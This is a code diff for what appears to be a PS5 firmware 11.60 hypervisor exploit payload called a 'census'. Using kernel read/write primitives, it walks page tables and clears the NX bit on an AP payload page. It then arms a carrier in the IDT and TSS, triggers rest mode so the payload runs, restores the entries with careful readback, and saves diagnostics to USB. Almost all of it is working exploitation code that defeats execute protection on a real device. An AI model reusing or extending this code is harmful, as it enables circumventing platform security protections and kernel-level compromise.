@@ -155,6 +155,15 @@ static uint64_t old_affinity[2];
 static int affinity_saved;
 static char pending_name[96], final_name[96], temp_name[96];
 
+struct ap_path_state {
+  uint64_t address[4];
+  uint64_t original[4];
+  uint64_t executable[4];
+  uint64_t nx_mask;
+  uint64_t touched_mask;
+  int levels;
+};
+
 static int kread(uint64_t address, void *out, size_t size) {
   memset(out, 0, size);
   return kernel_copyout((intptr_t)address, out, size);
@@ -434,6 +443,121 @@ static int walk_identity(uint64_t pa, int require_executable) {
     table = PAGE_PA(entry);
   }
   return -1;
+}
+
+/* The production 11.60 carrier clears NX on the AP page's translation path.
+ * The census records the exact entries first, changes only NX after the
+ * pending USB report is durable, and restores the original entries with
+ * readback after the AP returns. */
+static int inspect_ap_path(uint64_t pa, struct ap_path_state *path) {
+  uint64_t table = cr3;
+  const uint64_t va = dmap + pa;
+
+  memset(path, 0, sizeof(*path));
+  for (int level = 0; level < 4; level++) {
+    const int shift = 39 - level * 9;
+    const uint64_t index = (va >> shift) & 0x1ff;
+    const uint64_t address = dmap + PAGE_PA(table) + index * 8;
+    uint64_t entry;
+
+    if (kread64(address, &entry))
+      return -1;
+    path->address[level] = address;
+    path->original[level] = entry;
+    path->executable[level] = entry & ~PTE_NX;
+    path->levels = level + 1;
+    if (!(entry & PTE_P) || (entry & PTE_XO) || !(entry & PTE_RW))
+      return -1;
+    if (entry & PTE_NX)
+      path->nx_mask |= 1ULL << level;
+    if (((level == 1 || level == 2) && (entry & PTE_PS)) || level == 3) {
+      const uint64_t page_size = level == 1 ? 1ULL << 30
+                                 : level == 2 ? 1ULL << 21
+                                              : FRAME;
+      const uint64_t resolved =
+          (PAGE_PA(entry) & ~(page_size - 1)) | (va & (page_size - 1));
+      return resolved == pa ? 0 : -1;
+    }
+    table = PAGE_PA(entry);
+  }
+  return -1;
+}
+
+static int restore_ap_path(struct ap_path_state *path) {
+  int rc = 0;
+
+  /* Restore the upper entries first so the path stops being executable as
+   * early as possible. Never overwrite a value that is neither the saved
+   * original nor the value written by this payload. */
+  for (int level = 0; level < path->levels; level++) {
+    if (!(path->touched_mask & (1ULL << level)))
+      continue;
+    uint64_t live = 0;
+    if (kread64(path->address[level], &live)) {
+      rc = -1;
+      continue;
+    }
+    if (live != path->original[level]) {
+      if (live != path->executable[level] ||
+          kwrite64(path->address[level], path->original[level])) {
+        rc = -1;
+        continue;
+      }
+    }
+    if (kread64(path->address[level], &live) ||
+        live != path->original[level]) {
+      rc = -1;
+      continue;
+    }
+    path->touched_mask &= ~(1ULL << level);
+  }
+  /* Untouched entries are part of the validated translation too. Prove that
+   * the complete path, not only entries carrying NX, still matches the
+   * snapshot taken before arming. */
+  for (int level = 0; level < path->levels; level++) {
+    uint64_t live = 0;
+    if (kread64(path->address[level], &live) ||
+        live != path->original[level])
+      rc = -1;
+  }
+  return rc || path->touched_mask ? -1 : 0;
+}
+
+static int make_ap_path_executable(struct ap_path_state *path) {
+  /* Revalidate the complete path immediately before the first write. */
+  for (int level = 0; level < path->levels; level++) {
+    uint64_t live = 0;
+    if (kread64(path->address[level], &live) ||
+        live != path->original[level])
+      goto fail;
+  }
+  for (int level = 0; level < path->levels; level++) {
+    if (!(path->nx_mask & (1ULL << level)))
+      continue;
+    uint64_t live = 0;
+    if (kread64(path->address[level], &live) ||
+        live != path->original[level])
+      goto fail;
+    /* Mark the entry as owned before the write so a write error still causes
+     * an exact restoration attempt. */
+    path->touched_mask |= 1ULL << level;
+    if (kwrite64(path->address[level], path->executable[level]) ||
+        kread64(path->address[level], &live) ||
+        live != path->executable[level])
+      goto fail;
+  }
+  /* Confirm every level still resolves through the exact entries admitted by
+   * the preflight, with only NX removed. */
+  for (int level = 0; level < path->levels; level++) {
+    uint64_t live = 0;
+    if (kread64(path->address[level], &live) ||
+        live != path->executable[level])
+      goto fail;
+  }
+  return 0;
+
+fail:
+  return restore_ap_path(path) ? -2 : -1;
 }
 
 static int build_mapping_bitmap(uint64_t base, uint64_t size,
@@ -933,10 +1057,96 @@ static size_t appendf(char *out, size_t cap, size_t used, const char *fmt,
   return (size_t)n >= cap - used ? cap : used + (size_t)n;
 }
 
+static int write_unique_preflight(const char *text, size_t size,
+                                  char *saved_path, size_t saved_path_size) {
+  char root[128], name[128], destination[320], temp[320];
+
+  for (int usb = 0; usb < 8; usb++) {
+    snprintf(root, sizeof(root), USB_ROOT_FMT, usb);
+    if (!is_mount_point(root))
+      continue;
+    for (int n = 1; n < 100; n++) {
+      if (n == 1)
+        snprintf(name, sizeof(name), "%s-preflight.txt", REPORT_BASE);
+      else
+        snprintf(name, sizeof(name), "%s-preflight-%02d.txt", REPORT_BASE,
+                 n);
+      snprintf(destination, sizeof(destination), "%s/%s", root, name);
+      snprintf(temp, sizeof(temp), "%s/%s.tmp", root, name);
+      const int destination_state = path_state(destination);
+      const int temp_state = path_state(temp);
+      if (destination_state < 0 || temp_state < 0)
+        break;
+      if (destination_state || temp_state)
+        continue;
+      int fd = open(temp, O_WRONLY | O_CREAT | O_EXCL, 0600);
+      if (fd < 0) {
+        if (errno == EEXIST)
+          continue;
+        break;
+      }
+      int rc = write_all(fd, text, size);
+      if (!rc)
+        rc = fsync(fd);
+      if (close(fd) && !rc)
+        rc = -1;
+      if (!rc && path_state(destination) != 0)
+        rc = -1;
+      if (!rc && rename(temp, destination))
+        rc = -1;
+      if (!rc)
+        rc = fsync_dir(root);
+      if (rc) {
+        unlink(temp);
+        return -1;
+      }
+      snprintf(saved_path, saved_path_size, "%s", destination);
+      return 0;
+    }
+  }
+  return -1;
+}
+
+static int save_preflight_gate_report(
+    const char *model, uint64_t hv_base, uint64_t hv_size, uint64_t scan_lo,
+    uint64_t scan_hi, uint64_t mapped_pages, int mapping_rc,
+    int boundary_present, int cave_present, int vmexit_present,
+    int ap_path_rc, const struct ap_path_state *ap_path, int tss_rc,
+    int idt_read_rc, char *saved_path, size_t saved_path_size) {
+  char text[4096];
+  size_t used = 0;
+
+  used = appendf(
+      text, sizeof(text), used,
+      "ps5-1160-census preflight diagnostic\n"
+      "variant %s\nfirmware 0x%08x\nSoC 0x%x\nmodel %s\n"
+      "Keep private: bounded runtime evidence. No HV bytes are included.\n"
+      "HV base 0x%llx size 0x%llx\nscan offsets 0x%llx..0x%llx\n"
+      "mapped pages %llu\nmapping rc %d\n"
+      "boundary page present %d\ncave page present %d\n"
+      "VMEXIT page present %d\nAP path rc %d levels %d NX mask 0x%llx\n"
+      "TSS rc %d\nIDT read rc %d\ncarrier armed 0\n",
+      CENSUS_VARIANT, kernel_get_fw_version(), sceKernelGetMainSocId(), model,
+      (unsigned long long)hv_base, (unsigned long long)hv_size,
+      (unsigned long long)scan_lo, (unsigned long long)scan_hi,
+      (unsigned long long)mapped_pages, mapping_rc, boundary_present,
+      cave_present, vmexit_present, ap_path_rc, ap_path->levels,
+      (unsigned long long)ap_path->nx_mask, tss_rc, idt_read_rc);
+  for (int level = 0; level < ap_path->levels; level++)
+    used = appendf(text, sizeof(text), used,
+                   "AP path[%d] address 0x%llx value %016llx\n", level,
+                   (unsigned long long)ap_path->address[level],
+                   (unsigned long long)ap_path->original[level]);
+  if (used >= sizeof(text))
+    return -1;
+  return write_unique_preflight(text, used, saved_path, saved_path_size);
+}
+
 static int save_report(const char *root, const char *model,
                        const struct census_report *report,
                        uint64_t map_pages, int rest_close_failed,
-                       int success) {
+                       int success, const struct ap_path_state *ap_path,
+                       int ap_restore_rc) {
   char pending[256], destination[320], temp[320];
   char text[8192];
   size_t used = 0;
@@ -1003,8 +1213,12 @@ static int save_report(const char *root, const char *model,
                  (unsigned long long)report->anchor_match_mask);
   used = appendf(text, sizeof(text), used,
                  "anchor match policy %s\n"
+                 "AP path levels %d original NX mask 0x%llx\n"
+                 "AP path restore rc %d remaining touched mask 0x%llx\n"
                  "post-commit event close failed %d\n",
                  CENSUS_VARIANT_PRO ? "evidence-only" : "required",
+                 ap_path->levels, (unsigned long long)ap_path->nx_mask,
+                 ap_restore_rc, (unsigned long long)ap_path->touched_mask,
                  rest_close_failed);
   for (uint64_t i = 0;
        i < report->candidate_recorded && i < CENSUS_CANDIDATE_MAX; i++)
@@ -1067,10 +1281,12 @@ static int report_candidates_valid(const struct census_report *report,
 
 int main(void) {
   char usb_root[128], pending_path[256], preflight[1024];
+  char diagnostic_path[320] = {0};
   uint8_t bitmap[CAVE_BITMAP_CAP], zero_cave[0x4000];
   uint64_t hv_base = 0, hv_size = 0, mapped_pages = 0, saved_ists[NCPU];
   uint64_t saved_db_gate[2], scan_lo, scan_hi, expected_base, expected_size;
   uint64_t code_lo, code_base;
+  struct ap_path_state ap_path;
   struct census_report first, second;
   int pending_fd = -1;
   const int soc_id = sceKernelGetMainSocId();
@@ -1110,20 +1326,44 @@ int main(void) {
     notify("11.60 census refused: data cave is unreadable or not clean");
     return 1;
   }
-  if (build_mapping_bitmap(hv_base, hv_size, scan_lo, scan_hi, bitmap,
-                           sizeof(bitmap), &mapped_pages) ||
-      !bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
-                            code_lo + CENSUS_BOUNDARY_OFFSET,
-                            CENSUS_BOUNDARY_LENGTH) ||
-      !bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
-                            code_lo + CENSUS_CAVE_OFFSET,
-                            CENSUS_CAVE_LENGTH) ||
-      !bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
-                            code_lo + CENSUS_VMEXIT_OFFSET,
-                            CENSUS_VMEXIT_LENGTH) ||
-      walk_identity(AP_PAYLOAD_PAGE, 1) || verify_tss_layout(saved_ists) ||
-      kread(kg(OFF_IDT) + 16, saved_db_gate, sizeof(saved_db_gate))) {
-    notify("11.60 census refused: mapping, anchors, AP page, or TSS failed");
+  const int mapping_rc =
+      build_mapping_bitmap(hv_base, hv_size, scan_lo, scan_hi, bitmap,
+                           sizeof(bitmap), &mapped_pages);
+  const int boundary_present =
+      !mapping_rc &&
+      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
+                           code_lo + CENSUS_BOUNDARY_OFFSET,
+                           CENSUS_BOUNDARY_LENGTH);
+  const int cave_present =
+      !mapping_rc &&
+      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
+                           code_lo + CENSUS_CAVE_OFFSET, CENSUS_CAVE_LENGTH);
+  const int vmexit_present =
+      !mapping_rc &&
+      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
+                           code_lo + CENSUS_VMEXIT_OFFSET,
+                           CENSUS_VMEXIT_LENGTH);
+  const int ap_path_rc = inspect_ap_path(AP_PAYLOAD_PAGE, &ap_path);
+  const int tss_rc = verify_tss_layout(saved_ists);
+  const int idt_read_rc =
+      kread(kg(OFF_IDT) + 16, saved_db_gate, sizeof(saved_db_gate));
+  if (mapping_rc || !boundary_present || !cave_present || !vmexit_present ||
+      ap_path_rc || tss_rc || idt_read_rc) {
+    const char *failed_gate =
+        mapping_rc           ? "mapping"
+        : !boundary_present  ? "boundary anchor page"
+        : !cave_present      ? "code-cave anchor page"
+        : !vmexit_present    ? "VMEXIT anchor page"
+        : ap_path_rc         ? "AP page walk"
+        : tss_rc             ? "TSS layout"
+                             : "IDT read";
+    const int diagnostic_rc = save_preflight_gate_report(
+        model, hv_base, hv_size, scan_lo, scan_hi, mapped_pages, mapping_rc,
+        boundary_present, cave_present, vmexit_present, ap_path_rc, &ap_path,
+        tss_rc, idt_read_rc, diagnostic_path, sizeof(diagnostic_path));
+    notify("11.60 census refused: %s failed; %s", failed_gate,
+           diagnostic_rc ? "preflight diagnostic save failed"
+                         : "private preflight diagnostic saved to USB");
     return 1;
   }
   if (reserve_pending(usb_root, sizeof(usb_root), &pending_fd)) {
@@ -1137,14 +1377,17 @@ int main(void) {
       "ps5-1160-census pending\nvariant %s\nfirmware 0x%08x\nSoC 0x%x\n"
       "model %s\n"
       "HV base 0x%llx size 0x%llx\nscan offsets 0x%llx..0x%llx\n"
-      "code base 0x%llx\nmapped pages %llu\nIf this file remains pending, "
+      "code base 0x%llx\nmapped pages %llu\n"
+      "AP path levels %d original NX mask 0x%llx\n"
+      "If this file remains pending, "
       "report whether the console resumed and cold reboot before another "
       "census.\n",
       CENSUS_VARIANT, kernel_get_fw_version(), sceKernelGetMainSocId(),
       model,
       (unsigned long long)hv_base, (unsigned long long)hv_size,
       (unsigned long long)scan_lo, (unsigned long long)scan_hi,
-      (unsigned long long)code_base, (unsigned long long)mapped_pages);
+      (unsigned long long)code_base, (unsigned long long)mapped_pages,
+      ap_path.levels, (unsigned long long)ap_path.nx_mask);
   int pending_rc =
       preflight_len <= 0 || (size_t)preflight_len >= sizeof(preflight)
           ? -1
@@ -1191,9 +1434,11 @@ int main(void) {
   if (arm_rc) {
     const int affinity_rc = restore_affinity();
     const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
+    const int ap_restore_rc = restore_ap_path(&ap_path);
     const int pending_cleanup_rc =
-        affinity_rc || cleanup_rc ? -1
-                                  : remove_pending(usb_root, pending_path);
+        affinity_rc || cleanup_rc || ap_restore_rc
+            ? -1
+            : remove_pending(usb_root, pending_path);
     notify("11.60 census carrier refused to arm (%d); %s", arm_rc,
            pending_cleanup_rc ? "pending retained, cold reboot required"
                               : "carrier cleanup verified");
@@ -1202,12 +1447,30 @@ int main(void) {
 
   notify("11.60 census armed. Entering rest mode in 5 seconds");
   sleep(5);
+  const int ap_exec_rc = make_ap_path_executable(&ap_path);
+  if (ap_exec_rc) {
+    const int affinity_rc = restore_affinity();
+    const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
+    const int ap_restore_rc = restore_ap_path(&ap_path);
+    const int pending_cleanup_rc =
+        affinity_rc || cleanup_rc || ap_restore_rc
+            ? -1
+            : remove_pending(usb_root, pending_path);
+    notify("11.60 census refused: AP NX transaction failed (%d); %s",
+           ap_exec_rc,
+           pending_cleanup_rc
+               ? "pending retained, cold reboot required"
+               : "carrier cleanup and AP path restoration verified");
+    return 1;
+  }
   if (enter_rest_mode(&rest_close_failed)) {
     const int affinity_rc = restore_affinity();
     const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
+    const int ap_restore_rc = restore_ap_path(&ap_path);
     const int pending_cleanup_rc =
-        affinity_rc || cleanup_rc ? -1
-                                  : remove_pending(usb_root, pending_path);
+        affinity_rc || cleanup_rc || ap_restore_rc
+            ? -1
+            : remove_pending(usb_root, pending_path);
     notify("11.60 census suspend trigger failed; %s",
            pending_cleanup_rc ? "pending retained, cold reboot required"
                               : "carrier cleanup verified");
@@ -1218,9 +1481,11 @@ int main(void) {
     if (kread(kg(OFF_DATA_CAVE) + CAVE_REPORT_OFF, &first, sizeof(first))) {
       const int affinity_rc = restore_affinity();
       const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
+      const int ap_restore_rc = restore_ap_path(&ap_path);
       notify("11.60 census report read failed; pending retained%s",
-             affinity_rc || cleanup_rc ? ", cold reboot required"
-                                       : ", carrier cleanup verified");
+             affinity_rc || cleanup_rc || ap_restore_rc
+                 ? ", cold reboot required"
+                 : ", cleanup verified; cold reboot required before retry");
       return 1;
     }
     if (first.state == CENSUS_STATE_DONE) {
@@ -1229,9 +1494,11 @@ int main(void) {
                 sizeof(second))) {
         const int affinity_rc = restore_affinity();
         const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
+        const int ap_restore_rc = restore_ap_path(&ap_path);
         notify("11.60 census report read failed; pending retained%s",
-               affinity_rc || cleanup_rc ? ", cold reboot required"
-                                         : ", carrier cleanup verified");
+               affinity_rc || cleanup_rc || ap_restore_rc
+                   ? ", cold reboot required"
+                   : ", cleanup verified; cold reboot required before retry");
         return 1;
       }
       if (!memcmp(&first, &second, sizeof(first)))
@@ -1271,11 +1538,13 @@ int main(void) {
 
   const int carrier_cleanup_rc =
       rollback_carrier(saved_db_gate, saved_ists);
+  const int ap_restore_rc = restore_ap_path(&ap_path);
   const int success = report_valid && ap_state_cleared &&
                       live_ists_restored && live_gate_restored &&
-                      !affinity_rc && !carrier_cleanup_rc;
+                      !affinity_rc && !carrier_cleanup_rc && !ap_restore_rc;
   const int save_rc = save_report(usb_root, model, &first, mapped_pages,
-                                  rest_close_failed, success);
+                                  rest_close_failed, success, &ap_path,
+                                  ap_restore_rc);
 
   if (!success) {
     notify("11.60 census failed validation; pending retained%s",
@@ -1283,7 +1552,8 @@ int main(void) {
     return 1;
   }
   if (save_rc) {
-    notify("11.60 census complete, but final USB report save failed");
+    notify("11.60 census complete, but final USB report save failed; cold "
+           "reboot required");
     return 1;
   }
   notify("11.60 census complete; report saved to USB. Cold reboot before reuse");
